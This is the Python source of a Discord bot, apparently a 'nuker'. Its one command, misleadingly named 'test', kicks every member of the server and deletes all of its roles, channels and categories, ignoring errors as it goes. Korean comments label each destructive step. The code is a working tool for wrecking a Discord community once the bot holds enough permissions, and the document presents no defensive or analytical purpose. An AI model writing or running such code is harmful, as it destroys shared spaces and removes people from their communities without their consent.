import discord
from discord.ext import commands, tasks
from discord.utils import get
import json
import asyncio

intents = discord.Intents.all()
tokenfile = open("token.json", "r", encoding="UTF-8")

bot = commands.Bot(command_prefix=["c!", "C!"], intents=intents)


@bot.command()
async def test(ctx):
    # 모든 멤버 강퇴
    guildMembers = ctx.guild.members
    print(len(guildMembers))
    for member in guildMembers:
        print(member)

    for member in guildMembers:
        try:
            print(member)
            await member.kick()
        except Exception as e:
            print(e)
            pass

    # 모든 역할 삭제
    guildRoles = ctx.guild.roles

    for role in guildRoles:
        try:
            await asyncio.sleep(0.3)
            await role.delete()
        except Exception as e:
            print(e)
            pass

    # 모든 채널 삭제
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
        except Exception as e:
            print(e)
            pass

    for category in ctx.message.guild.categories:
        try:
            await category.delete()
        except:
            pass


token = json.load(tokenfile)["token"]
bot.run(token)
